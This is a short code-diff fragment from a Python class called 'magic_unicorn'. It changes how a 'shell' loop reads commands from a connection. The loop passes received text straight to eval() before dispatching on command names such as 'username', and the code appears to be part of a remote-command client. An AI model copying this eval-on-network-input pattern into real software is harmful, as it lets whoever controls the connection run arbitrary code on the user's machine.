@@ -183,7 +183,7 @@ class magic_unicorn:
     def shell(self):
         global s, unicorn
         while True:
-            command = unicorn.recv()
+            command = self.unicorn.recv()
             if command.strip():
                 command = eval(command.decode("UTF-8", "ignore").strip())
                 if command[0] == "username":
